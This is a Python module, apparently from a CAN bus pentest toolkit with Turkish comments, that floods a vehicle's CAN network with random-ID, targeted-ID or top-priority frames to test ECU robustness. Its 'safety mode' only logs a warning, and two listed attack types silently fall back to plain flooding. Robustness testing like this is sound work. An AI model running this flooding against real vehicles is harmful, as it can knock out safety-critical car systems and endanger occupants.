"""
CAN Bus DoS (Denial of Service) Test Modülü
Kvaser Memorator 2xHS - Windows

CAN bus'ta DoS saldırılarını test etme
ECU ve ağ dayanıklılığını test etmek için
"""

import logging
import time
import threading
from typing import Optional, Callable, Dict, Any, List
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

from can_pentest_core import CANPentestCore, CANMessage, PentestMode


class DoSType(Enum):
    """DoS saldırı tipleri"""
    BUS_FLOOD = "bus_flood"        # Bus'ı mesajlarla doldur
    SPECIFIC_ID = "specific_id"    # Belirli bir ID'yi hedefle
    ERROR_FRAMES = "error_frames"  # Error frame gönder
    REMOTE_FRAMES = "remote_frames"  # Remote frame spam
    PRIORITY_ABUSE = "priority_abuse"  # Yüksek öncelikli mesajlar


@dataclass
class DoSConfig:
    """DoS test konfigürasyonu"""
    dos_type: DoSType = DoSType.BUS_FLOOD

    # Hedef
    target_id: Optional[int] = None  # Spesifik ID hedefleme için

    # Mesaj parametreleri
    message_data: bytes = bytes([0xFF] * 8)
    dlc: int = 8

    # Timing
    interval_us: int = 0  # Mikrosaniye (0 = mümkün olduğunca hızlı)
    duration_sec: int = 10  # Test süresi
    max_messages: int = 100000  # Maksimum mesaj sayısı

    # Safety
    safety_mode: bool = True  # Güvenli mod


@dataclass
class DoSResult:
    """DoS test sonucu"""
    config: DoSConfig
    start_time: datetime
    end_time: datetime
    messages_sent: int
    peak_rate: float  # msg/s
    average_rate: float
    bus_errors: int
    success: bool


class CANDoS:
    """
    CAN Bus DoS Tester

    UYARI: Bu araç yalnızca test ortamlarında kullanılmalıdır!
    Gerçek araçlarda kullanımı tehlikeli olabilir!
    """

    def __init__(self, pentest_core: CANPentestCore):
        """
        Args:
            pentest_core: CAN pentest core instance
        """
        self.core = pentest_core
        self.config = DoSConfig()

        # State
        self.is_running = False
        self.dos_thread = None

        # Stats
        self.stats = {
            'messages_sent': 0,
            'errors': 0,
            'start_time': None,
            'peak_rate': 0.0,
            'rates': []  # Son N saniye için rate'ler
        }

        # Callbacks
        self.progress_callback: Optional[Callable[[Dict], None]] = None

        self.logger = logging.getLogger(__name__)
        self.logger.warning("CANDoS modülü yüklendi - SADECE TEST AMAÇLI!")

    def start_test(self, config: Optional[DoSConfig] = None) -> bool:
        """
        DoS test başlat

        Args:
            config: DoS konfigürasyonu

        Returns:
            Başarı durumu
        """
        if self.is_running:
            self.logger.warning("DoS testi zaten çalışıyor!")
            return False

        if not self.core.is_connected:
            self.logger.error("CAN bağlantısı yok!")
            return False

        if config:
            self.config = config

        # Güvenlik uyarısı
        if not self.config.safety_mode:
            self.logger.critical("UYARI: Safety mode kapalı! Tehlikeli!")

        # Core'u DoS moduna al
        self.core.set_mode(PentestMode.DOS)

        # Stats sıfırla
        self._reset_stats()

        # Thread başlat
        self.is_running = True
        self.dos_thread = threading.Thread(
            target=self._dos_loop,
            daemon=True,
            name="DoS"
        )
        self.dos_thread.start()

        self.logger.warning("DoS testi başlatıldı!")
        return True

    def stop_test(self):
        """DoS testini durdur"""
        self.is_running = False

        if self.dos_thread:
            self.dos_thread.join(timeout=2.0)

        self.core.set_mode(PentestMode.PASSIVE)
        self.logger.info("DoS testi durduruldu")

    def _reset_stats(self):
        """Stats sıfırla"""
        self.stats = {
            'messages_sent': 0,
            'errors': 0,
            'start_time': time.time(),
            'peak_rate': 0.0,
            'rates': []
        }

    def _dos_loop(self):
        """DoS ana döngüsü"""
        start_time = time.time()
        last_rate_calc = start_time
        last_count = 0

        while self.is_running:
            # Süre kontrolü
            elapsed = time.time() - start_time
            if elapsed > self.config.duration_sec:
                self.logger.info("DoS test süresi doldu")
                break

            # Mesaj sayısı kontrolü
            if self.stats['messages_sent'] >= self.config.max_messages:
                self.logger.info("Maksimum mesaj sayısına ulaşıldı")
                break

            # DoS tipine göre mesaj gönder
            self._send_dos_message()

            # Rate hesapla (her saniye)
            current_time = time.time()
            if current_time - last_rate_calc >= 1.0:
                rate = (self.stats['messages_sent'] - last_count) / (current_time - last_rate_calc)
                self.stats['rates'].append(rate)

                if rate > self.stats['peak_rate']:
                    self.stats['peak_rate'] = rate

                # Progress callback
                if self.progress_callback:
                    self.progress_callback({
                        'rate': rate,
                        'peak_rate': self.stats['peak_rate'],
                        'total': self.stats['messages_sent']
                    })

                last_rate_calc = current_time
                last_count = self.stats['messages_sent']

            # Interval
            if self.config.interval_us > 0:
                time.sleep(self.config.interval_us / 1_000_000.0)

        self.is_running = False

    def _send_dos_message(self):
        """DoS mesajı gönder"""
        dos_type = self.config.dos_type

        try:
            if dos_type == DoSType.BUS_FLOOD:
                self._bus_flood()
            elif dos_type == DoSType.SPECIFIC_ID:
                self._specific_id_attack()
            elif dos_type == DoSType.PRIORITY_ABUSE:
                self._priority_abuse()
            else:
                self._bus_flood()  # Default

        except Exception as e:
            self.logger.error(f"DoS mesaj hatası: {e}")
            self.stats['errors'] += 1

    def _bus_flood(self):
        """Bus flood saldırısı"""
        # Rastgele ID ile bus'ı doldur
        import random
        can_id = random.randint(0x000, 0x7FF)

        if self.core.send_message(can_id, self.config.message_data, self.config.dlc):
            self.stats['messages_sent'] += 1

    def _specific_id_attack(self):
        """Belirli bir ID'ye saldırı"""
        if self.config.target_id is None:
            self.logger.error("Target ID belirtilmedi!")
            return

        if self.core.send_message(self.config.target_id, self.config.message_data, self.config.dlc):
            self.stats['messages_sent'] += 1

    def _priority_abuse(self):
        """Yüksek öncelikli mesajlarla saldırı"""
        # Düşük ID = yüksek öncelik
        # 0x000 en yüksek öncelik
        can_id = 0x000

        if self.core.send_message(can_id, self.config.message_data, self.config.dlc):
            self.stats['messages_sent'] += 1

    def get_statistics(self) -> Dict[str, Any]:
        """İstatistikleri al"""
        elapsed = 0
        avg_rate = 0

        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                avg_rate = self.stats['messages_sent'] / elapsed

        return {
            'running': self.is_running,
            'elapsed': elapsed,
            'messages_sent': self.stats['messages_sent'],
            'errors': self.stats['errors'],
            'peak_rate': self.stats['peak_rate'],
            'average_rate': avg_rate
        }

    def get_result(self) -> DoSResult:
        """Sonuç al"""
        stats = self.get_statistics()

        return DoSResult(
            config=self.config,
            start_time=datetime.fromtimestamp(self.stats['start_time']),
            end_time=datetime.now(),
            messages_sent=self.stats['messages_sent'],
            peak_rate=self.stats['peak_rate'],
            average_rate=stats['average_rate'],
            bus_errors=self.stats['errors'],
            success=self.stats['messages_sent'] > 0
        )


if __name__ == "__main__":
    # Test
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    print("=" * 60)
    print("CAN DoS TESTER")
    print("UYARI: Sadece test ortamlarında kullanın!")
    print("=" * 60)

    # Core
    core = CANPentestCore(channel=0, bitrate=500000)

    if core.connect():
        # DoS tester
        dos = CANDoS(core)

        # Config
        config = DoSConfig(
            dos_type=DoSType.BUS_FLOOD,
            interval_us=1000,  # 1ms
            duration_sec=5,
            max_messages=5000,
            safety_mode=True
        )

        # Progress callback
        def on_progress(data):
            print(f"Rate: {data['rate']:.0f} msg/s, "
                  f"Peak: {data['peak_rate']:.0f} msg/s, "
                  f"Total: {data['total']}")

        dos.progress_callback = on_progress

        # Başlat
        print("\nDoS testi başlatılıyor...")
        user_input = input("Devam etmek istediğinize emin misiniz? (evet/hayır): ")

        if user_input.lower() == 'evet':
            dos.start_test(config)

            try:
                while dos.is_running:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print("\nDuruyor...")

            dos.stop_test()

            # Sonuç
            result = dos.get_result()
            print(f"\nDoS testi tamamlandı:")
            print(f"  Toplam mesaj: {result.messages_sent}")
            print(f"  Peak rate: {result.peak_rate:.0f} msg/s")
            print(f"  Ortalama rate: {result.average_rate:.0f} msg/s")
            print(f"  Hatalar: {result.bus_errors}")
        else:
            print("Test iptal edildi.")

        core.disconnect()
